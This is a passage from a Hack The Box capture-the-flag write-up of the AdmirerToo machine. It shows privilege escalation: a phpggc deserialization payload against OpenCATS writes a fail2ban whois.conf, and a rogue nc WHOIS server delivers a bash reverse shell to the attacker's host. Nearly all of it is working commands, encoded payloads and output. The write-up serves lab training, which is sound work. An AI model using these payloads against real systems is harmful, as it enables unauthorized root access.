ry for configuration files, and so he can write here an arbitrary whois.conf that can be used to exploit the RCE in fail2ban jennifer@admirertoo:/opt/opencats$ ls -ald /usr/local/etc drwxrwxr-x 2 root devel 4096 Jul 7 2021 /usr/local/etc Because the PHP deserialization writes json, we need to craft a specific POP gadget to write a clean conf file: ┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo] └─$ echo '}]|. [10.10.14.2]' > /tmp/payload ┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo] └─$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /tmp/payload a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D Exploited the PHP Object Injection and wrote the conf file: GET /index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.1 Host: 127.0.0.1:1337 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: CATS=rsiut3ufujk9etpjqesshnchfr Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 jennifer@admirertoo:~$ ls /usr/local/etc/ jennifer@admirertoo:~$ ls /usr/local/etc/ whois.conf jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf [{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.2]\n"}] Preparing and testing the WHOIS rogue server: ┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit] └─$ echo '~| bash -c "bash -i >& /dev/tcp/10.10.14.2/10099 0>&1" &' > fail2ban-rev.sh ┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit] └─$ sudo nc -nvlkp 43 -c "cat fail2ban-rev.sh" [sudo] password for kali: listening on [any] 43 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52964 jennifer@admirertoo:~$ whois 10.10.14.2 ~| bash -c "bash -i >& /dev/tcp/10.10.14.2/10099 0>&1" & fgets: Connection reset by peer Now we can force fail2ban into banning our IP in order to send an email to root (with root privileges) containing out malicious payload and obtaining RCE. Rogue WHOIS server: ┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit] └─$ sudo nc -nvlkp 43 -c "cat fail2ban-rev.sh" [sudo] password for kali: listening on [any] 43 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52976 Attempting to get banned: ┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit] └─$ ssh jennifer@admirertoo.htb ssh: connect to host admirertoo.htb port 22: Connection refused ┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit] └─$ ssh jennifer@admirertoo.htb jennifer@admirertoo.htb's password: Permission denied, please try